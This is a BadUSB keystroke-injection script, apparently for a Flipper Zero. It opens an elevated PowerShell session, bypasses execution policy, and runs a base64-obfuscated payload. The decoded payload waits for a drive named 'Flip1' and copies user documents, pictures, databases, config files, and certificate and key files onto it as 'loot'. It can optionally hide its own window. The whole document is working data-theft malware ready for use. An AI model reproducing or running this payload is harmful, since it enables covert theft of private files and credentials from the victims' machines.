DELAY 1000
CONTROL ESCAPE
DELAY 2000
STRING powershell
DELAY 500
RIGHTARROW
DOWNARROW
ENTER
DELAY 2000
ALT Y
DELAY 1000
STRING set-executionpolicy bypass -scope process -force
ENTER

STRING $driveName = 'Flip1'
ENTER
STRING $Hidden = 'N'
ENTER

STRING $code = "W0NvbnNvbGVdOjpCYWNrZ3JvdW5kQ29sb3IgPSAiQmxhY2siDQpbQ29uc29sZV06OlNldFdpbmRvd1NpemUoNTcsIDUpDQpbQ29uc29sZV06OlRpdGxlID0gIkV4ZmlsIg0KQ2xlYXItSG9zdA0KDQppZigkZHJpdmVOYW1lLmxlbmd0aCAtbHQgMSl7DQogICAgJGRyaXZlTmFtZSA9IFJlYWQtSG9zdCAiRW50ZXIgdGhlIG5hbWUgb2YgdGhlIFVTQiBkcml2ZSAiDQp9DQoNCmlmKCRoaWRkZW4ubGVuZ3RoIC1sdCAxKXsNCiAgICAkaGlkZGVuID0gUmVhZC1Ib3N0ICJXb3VsZCB5b3UgbGlrZSB0byBoaWRlIHRoaXMgY29uc29sZSB3aW5kb3c/IChZL04pICINCn0NCg0KJGkgPSAxMDANCg0KV2hpbGUgKCR0cnVlKXsNCiAgICBjbHMNCiAgICBXcml0ZS1Ib3N0ICJXYWl0aW5nIGZvciBVU0IgRHJpdmUuLiAoJGkpIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICRkcml2ZSA9IEdldC1XTUlPYmplY3QgV2luMzJfTG9naWNhbERpc2sgfCA/IHskXy5Wb2x1bWVOYW1lIC1lcSAkZHJpdmVOYW1lfSB8IHNlbGVjdCBEZXZpY2VJRA0KICAgIHNsZWVwIDENCiAgICBpZiAoJGRyaXZlLmxlbmd0aCAtbmUgMCl7DQogICAgICAgIFdyaXRlLUhvc3QgIlVTQiBEcml2ZSBDb25uZWN0ZWQhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgICAgIGJyZWFrDQogICAgfQ0KICAgICRpLS0NCiAgICBpZiAoJGkgLWVxIDAgKXsNCiAgICAgICAgV3JpdGUtSG9zdCAiVGltZW91dCEgRXhpdGluZyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgc2xlZXAgMQ0KICAgICAgICBleGl0DQogICAgfQ0KfQ0KDQpbQ29uc29sZV06OlNldFdpbmRvd1NpemUoODAsIDMwKQ0KDQokZHJpdmUgPSBHZXQtV01JT2JqZWN0IFdpbjMyX0xvZ2ljYWxEaXNrIHwgPyB7JF8uVm9sdW1lTmFtZSAtZXEgJGRyaXZlTmFtZX0NCiRkcml2ZWxldHRlciA9ICRkcml2ZS5EZXZpY2VJRA0KV3JpdGUtSG9zdCAiTG9vdCBEcml2ZSBTZXQgVG8gOiAkZHJpdmVMZXR0ZXIvIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQokZmlsZUV4dGVuc2lvbnMgPSBAKCIqLmxvZyIsICIqLmRiIiwgIioudHh0IiwgIiouZG9jIiwgIioucGRmIiwgIiouanBnIiwgIiouanBlZyIsICIqLnBuZyIsICIqLndkb2MiLCAiKi54ZG9jIiwgIiouY2VyIiwgIioua2V5IiwgIioueGxzIiwgIioueGxzeCIsICIqLmNmZyIsICIqLmNvbmYiLCAiKi53cGQiLCAiKi5yZnQiKQ0KJGZvbGRlcnNUb1NlYXJjaCA9IEAoIiRlbnY6VVNFUlBST0ZJTEVcRG9jdW1lbnRzIiwiJGVudjpVU0VSUFJPRklMRVxEZXNrdG9wIiwiJGVudjpVU0VSUFJPRklMRVxEb3dubG9hZHMiLCIkZW52OlVTRVJQUk9GSUxFXE9uZURyaXZlIiwiJGVudjpVU0VSUFJPRklMRVxQaWN0dXJlcyIsIiRlbnY6VVNFUlBST0ZJTEVcVmlkZW9zIikgIA0KJGRlc3RpbmF0aW9uUGF0aCA9ICIkZHJpdmVMZXR0ZXJcJGVudjpDT01QVVRFUk5BTUUtTG9vdCINCg0KaWYgKC1ub3QgKFRlc3QtUGF0aCAtUGF0aCAkZGVzdGluYXRpb25QYXRoKSkgew0KICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGRlc3RpbmF0aW9uUGF0aCAtRm9yY2UNCiAgICBXcml0ZS1Ib3N0ICJOZXcgRm9sZGVyIENyZWF0ZWQgOiAkZGVzdGluYXRpb25QYXRoIiAgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KfQ0KDQpJZiAoJGhpZGRlbiAtZXEgJ3knKXsNCiAgICBXcml0ZS1Ib3N0ICJIaWRpbmcgdGhlIFdpbmRvdy4uIiAgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICBzbGVlcCAxDQogICAgJEFzeW5jID0gJ1tEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93QXN5bmMoSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7Jw0KICAgICRUeXBlID0gQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJEFzeW5jIC1uYW1lIFdpbjMyU2hvd1dpbmRvd0FzeW5jIC1uYW1lc3BhY2UgV2luMzJGdW5jdGlvbnMgLVBhc3NUaHJ1DQogICAgJGh3bmQgPSAoR2V0LVByb2Nlc3MgLVBJRCAkcGlkKS5NYWluV2luZG93SGFuZGxlDQogICAgaWYoJGh3bmQgLW5lIFtTeXN0ZW0uSW50UHRyXTo6WmVybyl7DQogICAgICAgICRUeXBlOjpTaG93V2luZG93QXN5bmMoJGh3bmQsIDApDQogICAgfQ0KICAgIGVsc2V7DQogICAgICAgICRIb3N0LlVJLlJhd1VJLldpbmRvd1RpdGxlID0gJ2hpZGVtZScNCiAgICAgICAgJFByb2MgPSAoR2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyAkXy5NYWluV2luZG93VGl0bGUgLWVxICdoaWRlbWUnIH0pDQogICAgICAgICRod25kID0gJFByb2MuTWFpbldpbmRvd0hhbmRsZQ0KICAgICAgICAkVHlwZTo6U2hvd1dpbmRvd0FzeW5jKCRod25kLCAwKQ0KICAgIH0NCn0NCg0KZm9yZWFjaCAoJGZvbGRlciBpbiAkZm9sZGVyc1RvU2VhcmNoKSB7DQogICAgV3JpdGUtSG9zdCAiU2VhcmNoaW5nIGluICRmb2xkZXIiICAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgIA0KICAgIGZvcmVhY2ggKCRleHRlbnNpb24gaW4gJGZpbGVFeHRlbnNpb25zKSB7DQogICAgICAgICRmaWxlcyA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJGZvbGRlciAtUmVjdXJzZSAtRmlsdGVyICRleHRlbnNpb24gLUZpbGUNCg0KICAgICAgICBmb3JlYWNoICgkZmlsZSBpbiAkZmlsZXMpIHsNCiAgICAgICAgICAgICRkZXN0aW5hdGlvbkZpbGUgPSBKb2luLVBhdGggLVBhdGggJGRlc3RpbmF0aW9uUGF0aCAtQ2hpbGRQYXRoICRmaWxlLk5hbWUNCiAgICAgICAgICAgIFdyaXRlLUhvc3QgIkNvcHlpbmcgJCgkZmlsZS5GdWxsTmFtZSkgdG8gJCgkZGVzdGluYXRpb25GaWxlKSIgIC1Gb3JlZ3JvdW5kQ29sb3IgR3JheQ0KICAgICAgICAgICAgQ29weS1JdGVtIC1QYXRoICRmaWxlLkZ1bGxOYW1lIC1EZXN0aW5hdGlvbiAkZGVzdGluYXRpb25GaWxlIC1Gb3JjZQ0KICAgICAgICB9DQogICAgfQ0KfQ0KSWYgKCRoaWRkZW4gLWVxICd5Jyl7DQogICAgKE5ldy1PYmplY3QgLUNvbU9iamVjdCBXc2NyaXB0LlNoZWxsKS5Qb3B1cCgiRmlsZSBFeGZpbHRyYXRpb24gQ29tcGxldGUiLDUsIkV4ZmlsdHJhdGlvbiIsMHgwKQ0KfQ0KZWxzZXsNCiAgICBXcml0ZS1Ib3N0ICJGaWxlIEV4ZmlsdHJhdGlvbiBDb21wbGV0ZSIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KfQ=="
ENTER

STRING $bytes = [System.Convert]::FromBase64String($code)
ENTER
STRING $decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
ENTER
STRING Invoke-Expression $decoded
ENTER
